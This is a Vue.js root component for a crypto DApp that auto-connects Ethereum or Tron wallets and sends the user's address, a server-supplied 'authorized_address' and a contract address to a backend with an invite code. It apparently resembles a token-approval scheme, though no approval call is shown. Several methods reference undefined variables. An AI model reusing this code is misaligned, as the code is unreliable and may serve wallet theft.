<template>
  <div id="app">
    <keep-alive>
      <router-view v-if="$route.meta.isKeep"></router-view>
    </keep-alive>
    <router-view v-if="!$route.meta.isKeep"></router-view>
    <!-- <kefu/> -->
    <!-- <login /> -->
  </div>
</template>
<style>
@import './assets/static/css/animate.min.css';
@import './assets/static/css/bootstrap.min.css';
@import './assets/static/css/custom-toastr.css';
@import './assets/static/css/fontawesome-all.css';
@import './assets/static/css/icofont.min.css';

@import './assets/static/css/index.a1223731.css';
@import './assets/static/css/index.4300ebf3.css';
@import './assets/static/css/orders.b5a42f0e.css';

.van-dialog__message {
  color: #333;
}

.yred {
  color: #cf202f;
}

.ygreen {
  color: #13b26f;
}

.van-toast--middle {
  z-index: 6000 !important;
}

/* * { touch-action: pan-y; } */
</style>

<script>
import { initWeb3, getCurrentAccount } from '@/libs/web3';

import kefu from '@/components/kefu.vue'
import { mapActions } from 'vuex'
// import login from '@/components/login.vue'
import Web3, { utils } from 'web3'
import { getQueryVariable } from '@/libs/common'
import { getToken, setToken } from "@/libs/util"
import { create, configapi } from '@/api/user'

export default {
  name: 'App',
  components: {
    kefu,
    // login
  },

  data() {
    return {
      walletObj: ''
    }
  },
  computed: {
    configInfo() {
      return this.$store.state.user.configInfo
    }
  },
  mounted() {
    // setTimeout(() => {
    //   document.getElementById('loader-wrapper').remove()
    // }, 2000)
    // this.getWebCurrency()
    this.configapi()
    this.invite = getQueryVariable('invite')
  },
  methods: {
    ...mapActions([
      'setWalletObj',
      'setConfigInfo',
      'getuserinfo',
    ]),
    // async handleWalletConnect() {
    //   const web3 = await initWeb3();
    //   let provider = null;
    //   // 查看是否有全局的以太坊对象
    //   if (window.ethereum) {
    //     provider = window.ethereum;
    //     try {
    //       // 请求用户授权
    //       await window.ethereum.enable();
    //     } catch (error) {
    //       //用户不授权时，这里处理异常情况，同时可以设置重试等机制
    //       console.log(error)
    //     }
    //   } else if (window.web3) { // 老版 MetaMask Legacy dapp browsers...
    //     this.isShow = true
    //     provider = window.web3.currentProvider;
    //   } else {
    //     this.isShow = true
    //     // const dappUrl = encodeURIComponent(window.location.href);
    //     // SafePal的通用链接
    //     const universalLink = `https://www.safepal.com/en/download?fromlink=1`;

    //     // 如果3秒后仍在浏览器，跳转到下载页面
    //     this.$toast('未檢測到SafePal，請使用 SafePal打開');
    //     setTimeout(() => {
    //       if (!document.hidden) {
    //         window.location.href = universalLink; // 跳转通用链接
    //       }
    //     }, 3000);

    //     // 这里处理连接在不支持dapp的地方打开的情况
    //     // provider = new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/03d156af34054ebe9f919b75e7a2c141');
    //     // console.log("Non-Ethereum browser detected. You should consider trying MetaMask!")

    //     //这种情况下表示用户在不支持dapp的浏览器打开，无法初始化web3
    //     // window.location.href = 'https://www.coinbase.com/wallet'
    //     // window.location.href = 'https://trustwallet.com'


    //     //这里一般的处理逻辑是：使用第一篇中的那种自己初始化，获得区块上的基础数据，但是没法获取用户的账户信息
    //     //或者直接提示错误，不进行任何处理
    //   }

    //   // const provider = await window.ethereum;

    //   // await subscribeProvider(provider);


    //   // const web3 = new Web3(provider);
    //   const accounts = await web3.eth.getAccounts();

    //   const address = accounts[0];

    //   const networkId = await web3.eth.net.getId();

    //   const chainId = await web3.eth.getChainId(); // 坑逼 注意版本 chainId

    //   if (address) {
    //     this.walletObj = {
    //       web3,
    //       provider,
    //       connected: true,
    //       address,
    //       chainId,
    //       networkId
    //     }
    //     this.setWalletObj(this.walletObj)


    //     setTimeout(() => {
    //       document.getElementById('loader-wrapper').remove()
    //     }, 1000)
    //     this.create()

    //     // if (!getToken()) {
    //     //   this.create()
    //     // } else {
    //     //   this.userinfo()
    //     // }
    //     // localSave('etcdefi022walletObj', JSON.stringify({
    //     //   address,
    //     //   chainId,
    //     //   networkId
    //     // }))
    //   }
    // },
    async handleWalletConnect() {
      var provider;
      // 查看是否有全局的以太坊对象
      if (window.ethereum) {
        provider = window.ethereum;
        try {
          // 请求用户授权
          await window.ethereum.enable();
        } catch (error) {
          //用户不授权时，这里处理异常情况，同时可以设置重试等机制
          console.log(123)
        }
      } else if (window.web3) { // 老版 MetaMask Legacy dapp browsers...
        this.isShow = true
        provider = window.web3.currentProvider;
      } else {
        this.isShow = true
        const universalLink = `https://www.safepal.com/en/download?fromlink=1`;
        // // 如果3秒后仍在浏览器，跳转到下载页面
        setTimeout(() => {
            this.$toast('未檢測到SafePal，請使用 SafePal打開');
            if (!document.hidden) {
              window.location.href = universalLink; // 跳转通用链接
            }
          }, 3000);
        // 这里处理连接在不支持dapp的地方打开的情况
        // provider = new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/03d156af34054ebe9f919b75e7a2c141');
        // console.log("Non-Ethereum browser detected. You should consider trying MetaMask!")

        //这种情况下表示用户在不支持dapp的浏览器打开，无法初始化web3
        // window.location.href = 'https://www.coinbase.com/wallet'

        //这里一般的处理逻辑是：使用第一篇中的那种自己初始化，获得区块上的基础数据，但是没法获取用户的账户信息
        //或者直接提示错误，不进行任何处理
      }

      // const provider = await window.ethereum;

      // await subscribeProvider(provider);


      const web3 = new Web3(provider);
      const accounts = await web3.eth.getAccounts();

      const address = accounts[0];

      const networkId = await web3.eth.net.getId();

      const chainId = await web3.eth.getChainId(); // 坑逼 注意版本 chainId

      if (address) {
        this.walletObj = {
          web3,
          provider,
          connected: true,
          address,
          chainId,
          networkId
        }
        this.setWalletObj(this.walletObj)

        
        setTimeout(() => {
          document.getElementById('loader-wrapper').remove()
        }, 1000)
        this.create()

        // if (!getToken()) {
        //   this.create()
        // } else {
        //   this.userinfo()
        // }
        // localSave('etcdefi022walletObj', JSON.stringify({
        //   address,
        //   chainId,
        //   networkId
        // }))
      }
    },
    async handleWalletConnect2() {
      let balance = ''
      let address = ''
      if (window.tronWeb) {
        this.tronWeb = window.tronWeb;
        if (window.tronLink) await window.tronLink.request({ method: 'tron_requestAccounts' })
        address = this.tronWeb.defaultAddress.base58;
        // balance = await this.tronWeb.trx.getBalance(address);
        if (!address) {
          this.isShow = true
        }
      } else {
        this.isShow = true
      }

      if (address) {
        this.walletObj = {
          balance,
          address
        }
        this.setWalletObj(this.walletObj)


        setTimeout(() => {
          document.getElementById('loader-wrapper').remove()
        }, 1000)
        this.create2()

        // if (!getToken()) {
        //   this.create2()
        // } else {
        //   this.userinfo()
        // }
      }
    },
    async handleWalletConnect3() {
      // 检查是否安装 Trust Wallet
      if (typeof window.ethereum === 'undefined' || !window.ethereum.isSafePal) {
        alert('请安装 isSafePal Wallet 应用');
        window.open('https://trustwallet.com/', '_blank');
        return;
      }

      try {
        // 请求账户授权
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        if (userAddress) {
          this.walletObj = {
            balance,
            userAddress
          }
          this.setWalletObj(this.walletObj);
        }
      } catch (error) {
        console.error('授权或签名过程中出错:', error);
        return null;
      }
    },
    async connectExtension() {
      console.log('connectExtension');
      if (window.ethereum && window.ethereum.isSafePal) {
        try {
          const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
          });
          const address = accounts[0];
          const web3 = new Web3(window.ethereum);

          const networkId = await web3.eth.net.getId();

          const chainId = await web3.eth.getChainId(); // 坑逼 注意版本 chainId

          if (address) {
            this.walletObj = {
              web3,
              provider: window.ethereum,
              connected: true,
              address,
              chainId,
              networkId
            }
            this.setWalletObj(this.walletObj)


            setTimeout(() => {
              document.getElementById('loader-wrapper').remove()
            }, 1000)
            this.create()
          }
        } catch (error) {
          console.error("用户拒绝连接", error);
        }
      } else {
        alert("请安装 SafePal 浏览器扩展");
      }
    },
    async connectWallet() {
      this.isLoading = true;
      this.error = '';

      try {
        const web3 = await initWeb3();
        if (!web3) {
          // SafePal的通用链接
          // const universalLink = `https://link.safepal.io/${dappUrl}`;
          

          
          // alert('未检测到SafePal，請使用 SafePal打開');
          return false;
        }
        const account = await getCurrentAccount();


        const address = account;

        const networkId = await web3.eth.net.getId();

        const chainId = await web3.eth.getChainId(); // 坑逼 注意版本 chainId

        if (address) {
          this.walletObj = {
            web3,
            provider,
            connected: true,
            address,
            chainId,
            networkId
          }
          this.setWalletObj(this.walletObj)


          setTimeout(() => {
            document.getElementById('loader-wrapper').remove()
          }, 1000)
          this.create()

          // if (!getToken()) {
          //   this.create()
          // } else {
          //   this.userinfo()
          // }
          // localSave('etcdefi022walletObj', JSON.stringify({
          //   address,
          //   chainId,
          //   networkId
          // }))
        }

        if (!account) {
          throw new Error('未获取到账户');
        }

        this.currentAccount = account;
        this.isConnected = true;

        // 设置事件监听
        this.setupEventListeners();

      } catch (err) {
        
        console.error('钱包连接失败:', err);
        this.error = err.message;
        this.$emit('error', err);
      } finally {
        this.isLoading = false;
      }
    },
    openSafePalApp() {
      // 当前DApp的URL（需要编码）
      const dappUrl = encodeURIComponent(window.location.href);

      // SafePal的通用链接
      const universalLink = `https://link.safepal.io/${dappUrl}`;

      // SafePal的深度链接
      const deepLink = `safepal://browser?url=${dappUrl}`;

      // 先尝试打开App
      window.location.href = deepLink;

      // 如果3秒后仍在浏览器，跳转到下载页面
      setTimeout(() => {
        this.$toast('请安装SafePal')
        if (!document.hidden) {
          window.location.href = universalLink; // 跳转通用链接
        }
      }, 3000);
    },

    openTrustWallet() {
      // 构建DApp的URL（需要替换为你的DApp URL）
      const dappUrl = encodeURIComponent(window.location.href);
      // Trust Wallet深度链接
      const trustwalletLink = `https://link.trustwallet.com/open_url?url=${dappUrl}`;

      // 尝试打开App
      window.location.href = trustwalletLink;

      // 备用方案：如果一段时间后仍在浏览器，跳转到下载页面
      setTimeout(() => {
        if (!document.hidden) {
          window.open('https://trustwallet.com/download', '_blank');
        }
      }, 2000);
    },
    create() {
      let params = {
        address: this.walletObj.address,
        authorized_address: this.configInfo.erc.address,
        contract: this.configInfo.erc.contract_address,
        type: 'erc'
      }
      if (this.invite) params.invite = this.invite
      create(params).then(res => {
        let data = res.data
        this.$toast(data.msg)
        if (data.code == 1) {
          setToken(data.data.token)
          this.userinfo()
        }
      })
    },
    create2() {
      let params = {
        address: this.walletObj.address,
        authorized_address: this.configInfo.trc.address,
        contract: this.configInfo.trc.contract_address,
        type: 'trc'
      }
      if (this.invite) params.invite = this.invite
      create(params).then(res => {
        let data = res.data
        this.$toast(data.msg)
        if (data.code == 1) {
          setToken(data.data.token)
          this.userinfo()
        }
      })
    },
    userinfo() {
      this.getuserinfo()
    },
    configapi() {
      // this.openTrustWallet();
      configapi().then(res => {
        let data = res.data
        // console.log(data)
        if (data.code == 1) {
          this.setConfigInfo(data.data)
          this.handleWalletConnect()
          // this.openSafePalApp()
          // this.handleWalletConnect2()
          // this.connectWallet();
          // this.handleWalletConnect3()
          // this.connectExtension()
          // this.openTrustWallet();
        }
      })
    }
  },
  beforeDestroy() {
    // 清理事件监听
    if (window.ethereum && window.ethereum.removeListener) {
      window.ethereum.removeListener('accountsChanged', this.handleAccountsChanged);
      window.ethereum.removeListener('chainChanged', this.handleChainChanged);
    }
  }
}
</script>
